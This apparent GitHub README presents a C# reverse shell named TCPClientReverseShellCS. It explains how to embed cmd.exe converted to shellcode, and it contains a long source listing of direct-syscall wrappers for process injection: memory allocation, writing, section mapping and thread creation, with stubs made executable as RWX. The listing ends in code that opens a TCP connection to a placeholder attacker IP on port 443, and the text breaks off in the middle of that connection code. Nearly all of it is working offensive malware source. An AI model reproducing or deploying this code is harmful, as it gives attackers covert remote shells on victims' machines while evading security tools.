# TCPClientReverseShellCS
C# reverse shell using TCPClient

Convert Windows cmd.exe or ReactOS cmd.exe to shellcode and embed. If one use Windows cmd.exe shellcode version the only "error" minor, it complains over missing code page.

Compile with https://github.com/mobdk/compilecs and insert entrypoint. 
This don't need a compiled C++ .dll to establish connection, it's done in C# code. This version uses syscalls.

```
using System;
using System.Security;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.ConstrainedExecution;
using System.Management;
using System.Security.Principal;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;


public class Code
{

          const int PROCESS_CREATE_THREAD = 0x0002;
          const int PROCESS_QUERY_INFORMATION = 0x0400;
          const int PROCESS_VM_OPERATION = 0x0008;
          const int PROCESS_VM_WRITE = 0x0020;
          const int PROCESS_VM_READ = 0x0010;
          const uint MEM_COMMIT = 0x00001000;
          const uint MEM_RESERVE = 0x00002000;
          const uint PAGE_READWRITE = 4;
          const uint PAGE_EXECUTE_READWRITE = 0x40;
          public const uint GENERIC_ALL = 0x1FFFFF;

          public static TcpClient tcpClient;
          public static NetworkStream stream;
          public static StreamReader streamReader;
          public static StreamWriter streamWriter;
          public static StringBuilder UserInput;

          [StructLayout(LayoutKind.Sequential)]
          public struct OBJECT_ATTRIBUTES
          {
              public ulong Length;
              public IntPtr RootDirectory;
              public IntPtr ObjectName;
              public ulong Attributes;
              public IntPtr SecurityDescriptor;
              public IntPtr SecurityQualityOfService;
          }

          public struct CLIENT_ID
          {
              public IntPtr UniqueProcess;
              public IntPtr UniqueThread;
          }


          public enum NTSTATUS : uint
          {
              Success = 0x00000000,
              Wait0 = 0x00000000,
              Wait1 = 0x00000001,
              Wait2 = 0x00000002,
              Wait3 = 0x00000003,
              Wait63 = 0x0000003f,
              Abandoned = 0x00000080,
              AbandonedWait0 = 0x00000080,
              AbandonedWait1 = 0x00000081,
              AbandonedWait2 = 0x00000082,
              AbandonedWait3 = 0x00000083,
              AbandonedWait63 = 0x000000bf,
              UserApc = 0x000000c0,
              KernelApc = 0x00000100,
              Alerted = 0x00000101,
              Timeout = 0x00000102,
              Pending = 0x00000103,
              Reparse = 0x00000104,
              MoreEntries = 0x00000105,
              NotAllAssigned = 0x00000106,
              SomeNotMapped = 0x00000107,
              OpLockBreakInProgress = 0x00000108,
              VolumeMounted = 0x00000109,
              RxActCommitted = 0x0000010a,
              NotifyCleanup = 0x0000010b,
              NotifyEnumDir = 0x0000010c,
              NoQuotasForAccount = 0x0000010d,
              PrimaryTransportConnectFailed = 0x0000010e,
              PageFaultTransition = 0x00000110,
              PageFaultDemandZero = 0x00000111,
              PageFaultCopyOnWrite = 0x00000112,
              PageFaultGuardPage = 0x00000113,
              PageFaultPagingFile = 0x00000114,
              CrashDump = 0x00000116,
              ReparseObject = 0x00000118,
              NothingToTerminate = 0x00000122,
              ProcessNotInJob = 0x00000123,
              ProcessInJob = 0x00000124,
              ProcessCloned = 0x00000129,
              FileLockedWithOnlyReaders = 0x0000012a,
              FileLockedWithWriters = 0x0000012b,
              Informational = 0x40000000,
              ObjectNameExists = 0x40000000,
              ThreadWasSuspended = 0x40000001,
              WorkingSetLimitRange = 0x40000002,
              ImageNotAtBase = 0x40000003,
              RegistryRecovered = 0x40000009,
              Warning = 0x80000000,
              GuardPageViolation = 0x80000001,
              DatatypeMisalignment = 0x80000002,
              Breakpoint = 0x80000003,
              SingleStep = 0x80000004,
              BufferOverflow = 0x80000005,
              NoMoreFiles = 0x80000006,
              HandlesClosed = 0x8000000a,
              PartialCopy = 0x8000000d,
              DeviceBusy = 0x80000011,
              InvalidEaName = 0x80000013,
              EaListInconsistent = 0x80000014,
              NoMoreEntries = 0x8000001a,
              LongJump = 0x80000026,
              DllMightBeInsecure = 0x8000002b,
              Error = 0xc0000000,
              Unsuccessful = 0xc0000001,
              NotImplemented = 0xc0000002,
              InvalidInfoClass = 0xc0000003,
              InfoLengthMismatch = 0xc0000004,
              AccessViolation = 0xc0000005,
              InPageError = 0xc0000006,
              PagefileQuota = 0xc0000007,
              InvalidHandle = 0xc0000008,
              BadInitialStack = 0xc0000009,
              BadInitialPc = 0xc000000a,
              InvalidCid = 0xc000000b,
              TimerNotCanceled = 0xc000000c,
              InvalidParameter = 0xc000000d,
              NoSuchDevice = 0xc000000e,
              NoSuchFile = 0xc000000f,
              InvalidDeviceRequest = 0xc0000010,
              EndOfFile = 0xc0000011,
              WrongVolume = 0xc0000012,
              NoMediaInDevice = 0xc0000013,
              NoMemory = 0xc0000017,
              ConflictingAddresses = 0xc0000018,
              NotMappedView = 0xc0000019,
              UnableToFreeVm = 0xc000001a,
              UnableToDeleteSection = 0xc000001b,
              IllegalInstruction = 0xc000001d,
              AlreadyCommitted = 0xc0000021,
              AccessDenied = 0xc0000022,
              BufferTooSmall = 0xc0000023,
              ObjectTypeMismatch = 0xc0000024,
              NonContinuableException = 0xc0000025,
              BadStack = 0xc0000028,
              NotLocked = 0xc000002a,
              NotCommitted = 0xc000002d,
              InvalidParameterMix = 0xc0000030,
              ObjectNameInvalid = 0xc0000033,
              ObjectNameNotFound = 0xc0000034,
              ObjectNameCollision = 0xc0000035,
              ObjectPathInvalid = 0xc0000039,
              ObjectPathNotFound = 0xc000003a,
              ObjectPathSyntaxBad = 0xc000003b,
              DataOverrun = 0xc000003c,
              DataLate = 0xc000003d,
              DataError = 0xc000003e,
              CrcError = 0xc000003f,
              SectionTooBig = 0xc0000040,
              PortConnectionRefused = 0xc0000041,
              InvalidPortHandle = 0xc0000042,
              SharingViolation = 0xc0000043,
              QuotaExceeded = 0xc0000044,
              InvalidPageProtection = 0xc0000045,
              MutantNotOwned = 0xc0000046,
              SemaphoreLimitExceeded = 0xc0000047,
              PortAlreadySet = 0xc0000048,
              SectionNotImage = 0xc0000049,
              SuspendCountExceeded = 0xc000004a,
              ThreadIsTerminating = 0xc000004b,
              BadWorkingSetLimit = 0xc000004c,
              IncompatibleFileMap = 0xc000004d,
              SectionProtection = 0xc000004e,
              EasNotSupported = 0xc000004f,
              EaTooLarge = 0xc0000050,
              NonExistentEaEntry = 0xc0000051,
              NoEasOnFile = 0xc0000052,
              EaCorruptError = 0xc0000053,
              FileLockConflict = 0xc0000054,
              LockNotGranted = 0xc0000055,
              DeletePending = 0xc0000056,
              CtlFileNotSupported = 0xc0000057,
              UnknownRevision = 0xc0000058,
              RevisionMismatch = 0xc0000059,
              InvalidOwner = 0xc000005a,
              InvalidPrimaryGroup = 0xc000005b,
              NoImpersonationToken = 0xc000005c,
              CantDisableMandatory = 0xc000005d,
              NoLogonServers = 0xc000005e,
              NoSuchLogonSession = 0xc000005f,
              NoSuchPrivilege = 0xc0000060,
              PrivilegeNotHeld = 0xc0000061,
              InvalidAccountName = 0xc0000062,
              UserExists = 0xc0000063,
              NoSuchUser = 0xc0000064,
              GroupExists = 0xc0000065,
              NoSuchGroup = 0xc0000066,
              MemberInGroup = 0xc0000067,
              MemberNotInGroup = 0xc0000068,
              LastAdmin = 0xc0000069,
              WrongPassword = 0xc000006a,
              IllFormedPassword = 0xc000006b,
              PasswordRestriction = 0xc000006c,
              LogonFailure = 0xc000006d,
              AccountRestriction = 0xc000006e,
              InvalidLogonHours = 0xc000006f,
              InvalidWorkstation = 0xc0000070,
              PasswordExpired = 0xc0000071,
              AccountDisabled = 0xc0000072,
              NoneMapped = 0xc0000073,
              TooManyLuidsRequested = 0xc0000074,
              LuidsExhausted = 0xc0000075,
              InvalidSubAuthority = 0xc0000076,
              InvalidAcl = 0xc0000077,
              InvalidSid = 0xc0000078,
              InvalidSecurityDescr = 0xc0000079,
              ProcedureNotFound = 0xc000007a,
              InvalidImageFormat = 0xc000007b,
              NoToken = 0xc000007c,
              BadInheritanceAcl = 0xc000007d,
              RangeNotLocked = 0xc000007e,
              DiskFull = 0xc000007f,
              ServerDisabled = 0xc0000080,
              ServerNotDisabled = 0xc0000081,
              TooManyGuidsRequested = 0xc0000082,
              GuidsExhausted = 0xc0000083,
              InvalidIdAuthority = 0xc0000084,
              AgentsExhausted = 0xc0000085,
              InvalidVolumeLabel = 0xc0000086,
              SectionNotExtended = 0xc0000087,
              NotMappedData = 0xc0000088,
              ResourceDataNotFound = 0xc0000089,
              ResourceTypeNotFound = 0xc000008a,
              ResourceNameNotFound = 0xc000008b,
              ArrayBoundsExceeded = 0xc000008c,
              FloatDenormalOperand = 0xc000008d,
              FloatDivideByZero = 0xc000008e,
              FloatInexactResult = 0xc000008f,
              FloatInvalidOperation = 0xc0000090,
              FloatOverflow = 0xc0000091,
              FloatStackCheck = 0xc0000092,
              FloatUnderflow = 0xc0000093,
              IntegerDivideByZero = 0xc0000094,
              IntegerOverflow = 0xc0000095,
              PrivilegedInstruction = 0xc0000096,
              TooManyPagingFiles = 0xc0000097,
              FileInvalid = 0xc0000098,
              InstanceNotAvailable = 0xc00000ab,
              PipeNotAvailable = 0xc00000ac,
              InvalidPipeState = 0xc00000ad,
              PipeBusy = 0xc00000ae,
              IllegalFunction = 0xc00000af,
              PipeDisconnected = 0xc00000b0,
              PipeClosing = 0xc00000b1,
              PipeConnected = 0xc00000b2,
              PipeListening = 0xc00000b3,
              InvalidReadMode = 0xc00000b4,
              IoTimeout = 0xc00000b5,
              FileForcedClosed = 0xc00000b6,
              ProfilingNotStarted = 0xc00000b7,
              ProfilingNotStopped = 0xc00000b8,
              NotSameDevice = 0xc00000d4,
              FileRenamed = 0xc00000d5,
              CantWait = 0xc00000d8,
              PipeEmpty = 0xc00000d9,
              CantTerminateSelf = 0xc00000db,
              InternalError = 0xc00000e5,
              InvalidParameter1 = 0xc00000ef,
              InvalidParameter2 = 0xc00000f0,
              InvalidParameter3 = 0xc00000f1,
              InvalidParameter4 = 0xc00000f2,
              InvalidParameter5 = 0xc00000f3,
              InvalidParameter6 = 0xc00000f4,
              InvalidParameter7 = 0xc00000f5,
              InvalidParameter8 = 0xc00000f6,
              InvalidParameter9 = 0xc00000f7,
              InvalidParameter10 = 0xc00000f8,
              InvalidParameter11 = 0xc00000f9,
              InvalidParameter12 = 0xc00000fa,
              MappedFileSizeZero = 0xc000011e,
              TooManyOpenedFiles = 0xc000011f,
              Cancelled = 0xc0000120,
              CannotDelete = 0xc0000121,
              InvalidComputerName = 0xc0000122,
              FileDeleted = 0xc0000123,
              SpecialAccount = 0xc0000124,
              SpecialGroup = 0xc0000125,
              SpecialUser = 0xc0000126,
              MembersPrimaryGroup = 0xc0000127,
              FileClosed = 0xc0000128,
              TooManyThreads = 0xc0000129,
              ThreadNotInProcess = 0xc000012a,
              TokenAlreadyInUse = 0xc000012b,
              PagefileQuotaExceeded = 0xc000012c,
              CommitmentLimit = 0xc000012d,
              InvalidImageLeFormat = 0xc000012e,
              InvalidImageNotMz = 0xc000012f,
              InvalidImageProtect = 0xc0000130,
              InvalidImageWin16 = 0xc0000131,
              LogonServer = 0xc0000132,
              DifferenceAtDc = 0xc0000133,
              SynchronizationRequired = 0xc0000134,
              DllNotFound = 0xc0000135,
              IoPrivilegeFailed = 0xc0000137,
              OrdinalNotFound = 0xc0000138,
              EntryPointNotFound = 0xc0000139,
              ControlCExit = 0xc000013a,
              PortNotSet = 0xc0000353,
              DebuggerInactive = 0xc0000354,
              CallbackBypass = 0xc0000503,
              PortClosed = 0xc0000700,
              MessageLost = 0xc0000701,
              InvalidMessage = 0xc0000702,
              RequestCanceled = 0xc0000703,
              RecursiveDispatch = 0xc0000704,
              LpcReceiveBufferExpected = 0xc0000705,
              LpcInvalidConnectionUsage = 0xc0000706,
              LpcRequestsNotAllowed = 0xc0000707,
              ResourceInUse = 0xc0000708,
              ProcessIsProtected = 0xc0000712,
              VolumeDirty = 0xc0000806,
              FileCheckedOut = 0xc0000901,
              CheckOutRequired = 0xc0000902,
              BadFileType = 0xc0000903,
              FileTooLarge = 0xc0000904,
              FormsAuthRequired = 0xc0000905,
              VirusInfected = 0xc0000906,
              VirusDeleted = 0xc0000907,
              TransactionalConflict = 0xc0190001,
              InvalidTransaction = 0xc0190002,
              TransactionNotActive = 0xc0190003,
              TmInitializationFailed = 0xc0190004,
              RmNotActive = 0xc0190005,
              RmMetadataCorrupt = 0xc0190006,
              TransactionNotJoined = 0xc0190007,
              DirectoryNotRm = 0xc0190008,
              CouldNotResizeLog = 0xc0190009,
              TransactionsUnsupportedRemote = 0xc019000a,
              LogResizeInvalidSize = 0xc019000b,
              RemoteFileVersionMismatch = 0xc019000c,
              CrmProtocolAlreadyExists = 0xc019000f,
              TransactionPropagationFailed = 0xc0190010,
              CrmProtocolNotFound = 0xc0190011,
              TransactionSuperiorExists = 0xc0190012,
              TransactionRequestNotValid = 0xc0190013,
              TransactionNotRequested = 0xc0190014,
              TransactionAlreadyAborted = 0xc0190015,
              TransactionAlreadyCommitted = 0xc0190016,
              TransactionInvalidMarshallBuffer = 0xc0190017,
              CurrentTransactionNotValid = 0xc0190018,
              LogGrowthFailed = 0xc0190019,
              ObjectNoLongerExists = 0xc0190021,
              StreamMiniversionNotFound = 0xc0190022,
              StreamMiniversionNotValid = 0xc0190023,
              MiniversionInaccessibleFromSpecifiedTransaction = 0xc0190024,
              CantOpenMiniversionWithModifyIntent = 0xc0190025,
              CantCreateMoreStreamMiniversions = 0xc0190026,
              HandleNoLongerValid = 0xc0190028,
              NoTxfMetadata = 0xc0190029,
              LogCorruptionDetected = 0xc0190030,
              CantRecoverWithHandleOpen = 0xc0190031,
              RmDisconnected = 0xc0190032,
              EnlistmentNotSuperior = 0xc0190033,
              RecoveryNotNeeded = 0xc0190034,
              RmAlreadyStarted = 0xc0190035,
              FileIdentityNotPersistent = 0xc0190036,
              CantBreakTransactionalDependency = 0xc0190037,
              CantCrossRmBoundary = 0xc0190038,
              TxfDirNotEmpty = 0xc0190039,
              IndoubtTransactionsExist = 0xc019003a,
              TmVolatile = 0xc019003b,
              RollbackTimerExpired = 0xc019003c,
              TxfAttributeCorrupt = 0xc019003d,
              EfsNotAllowedInTransaction = 0xc019003e,
              TransactionalOpenNotAllowed = 0xc019003f,
              TransactedMappingUnsupportedRemote = 0xc0190040,
              TxfMetadataAlreadyPresent = 0xc0190041,
              TransactionScopeCallbacksNotSet = 0xc0190042,
              TransactionRequiredPromotion = 0xc0190043,
              CannotExecuteFileInTransaction = 0xc0190044,
              TransactionsNotFrozen = 0xc0190045,
              MaximumNtStatus = 0xffffffff
      };


        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct OSVERSIONINFOEXW
        {
            public int dwOSVersionInfoSize;
            public int dwMajorVersion;
            public int dwMinorVersion;
            public int dwBuildNumber;
            public int dwPlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string szCSDVersion;
            public UInt16 wServicePackMajor;
            public UInt16 wServicePackMinor;
            public UInt16 wSuiteMask;
            public byte wProductType;
            public byte wReserved;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public UInt32 LowPart;
            public UInt32 HighPart;
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
        [SuppressUnmanagedCodeSecurity]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);



        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern NTSTATUS RtlGetVersion(ref OSVERSIONINFOEXW versionInfo);

        [DllImport("ntdll.dll")]
        public static extern NTSTATUS NtProtectVirtualMemory( [In] IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, [In] MemoryProtection NewProtect, [Out] out MemoryProtection OldProtect );

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtOpenProcessX(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtWriteVirtualMemoryX(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtAllocateVirtualMemoryX(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtCreateThreadExX(out IntPtr threadHandle,uint desiredAccess,IntPtr objectAttributes,IntPtr processHandle,IntPtr lpStartAddress,IntPtr lpParameter,int createSuspended,uint stackZeroBits,uint sizeOfStackCommit,uint sizeOfStackReserve,IntPtr lpBytesBuffer);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtCreateSectionX(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS ZwMapViewOfSectionX(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtProtectVirtualMemoryX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtCreateProcessX( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtOpenThreadX( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

        [SuppressUnmanagedCodeSecurity]
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate NTSTATUS NtResumeThreadX( IntPtr threadHandle, out ulong SuspendCount);


        public static NTSTATUS NtOpenProcess(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 1 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtOpenProcessX NtOpenProcessFunc = (NtOpenProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtOpenProcessX));
                        return (NTSTATUS)NtOpenProcessFunc(out hProcess, processAccess, objAttribute, ref clientid);
                    }

                }
        }

        public static NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr lpStartAddress, IntPtr lpParameter, int createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr lpBytesBuffer)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 2 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtCreateThreadExX NtCreateThreadExFunc = (NtCreateThreadExX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateThreadExX));
                        return (NTSTATUS)NtCreateThreadExFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, lpStartAddress, lpParameter, createSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, lpBytesBuffer);
                    }
                }
        }

        public static NTSTATUS NtWriteVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 3 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtWriteVirtualMemoryX NtWriteVirtualMemoryFunc = (NtWriteVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtWriteVirtualMemoryX));
                        return (NTSTATUS)NtWriteVirtualMemoryFunc(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
                    }
                }
        }


        public static NTSTATUS NtAllocateVirtualMemory(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 4 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtAllocateVirtualMemoryX NtAllocateVirtualMemoryFunc = (NtAllocateVirtualMemoryX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtAllocateVirtualMemoryX));
                        return (NTSTATUS)NtAllocateVirtualMemoryFunc(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
                    }
                }
        }

        public static NTSTATUS NtCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 5 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtCreateSectionX NtCreateSectionFunc = (NtCreateSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateSectionX));
                        return (NTSTATUS)NtCreateSectionFunc(ref section, desiredAccess, pAttrs, ref pMaxSize, pageProt, allocationAttribs, hFile);
                    }
                }
        }

        public static NTSTATUS NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 6 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        ZwMapViewOfSectionX NtMapViewOfSectionFunc = (ZwMapViewOfSectionX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(ZwMapViewOfSectionX));
                        return (NTSTATUS)NtMapViewOfSectionFunc(section, process, ref baseAddr, zeroBits, commitSize, stuff, ref viewSize, inheritDispo, alloctype, prot);
                    }
                }
        }

        public static NTSTATUS NtCreateProcess( out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes, IntPtr processHandle, bool InheritObjectTable, IntPtr SectionHandle, IntPtr DebugPort, IntPtr ExceptionPort)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 7 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtCreateProcessX NtCreateProcessFunc = (NtCreateProcessX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtCreateProcessX));
                        return (NTSTATUS)NtCreateProcessFunc(out threadHandle, desiredAccess, objectAttributes, processHandle, InheritObjectTable, SectionHandle, DebugPort, ExceptionPort);
                    }
                }
        }

        public static NTSTATUS NtOpenThread( IntPtr threadHandle, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 8 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtOpenThreadX NtOpenThreadFunc = (NtOpenThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtOpenThreadX));
                        return (NTSTATUS)NtOpenThreadFunc(threadHandle, processAccess, objAttribute, ref clientid);
                    }

                }
        }

        public static NTSTATUS NtResumeThread( IntPtr threadHandle, out ulong SuspendCount)
        {
                byte [] syscall = GetOSVersionAndReturnSyscall( 9 );
                unsafe
                {
                    fixed (byte* ptr = syscall)
                    {
                        IntPtr allocMemAddress = (IntPtr)ptr;
                        IntPtr allocMemAddressCopy = (IntPtr)ptr;
                        MemoryProtection oldProtection;
                        uint size = (uint)syscall.Length;
                        IntPtr sizeIntPtr = (IntPtr)size;
                        NTSTATUS status = NtProtectVirtualMemory( (IntPtr)Process.GetCurrentProcess().Handle, ref allocMemAddress, ref sizeIntPtr, MemoryProtection.ExecuteReadWrite , out oldProtection );
                        NtResumeThreadX NtResumeThreadFunc = (NtResumeThreadX)Marshal.GetDelegateForFunctionPointer(allocMemAddressCopy, typeof(NtResumeThreadX));
                        return (NTSTATUS)NtResumeThreadFunc(threadHandle, out SuspendCount);
                    }

                }
        }


        public static void Program()
        {

          byte [] scode = new byte [ --- Insert shellcode length ---] { --- Insert shellcode --- };
          
          string IP = "IP ADDRESS";
          int port = 443;
          tcpClient = new TcpClient();
          UserInput = new StringBuilder();

          if (!tcpClient.Connected)
          {
              try
              {
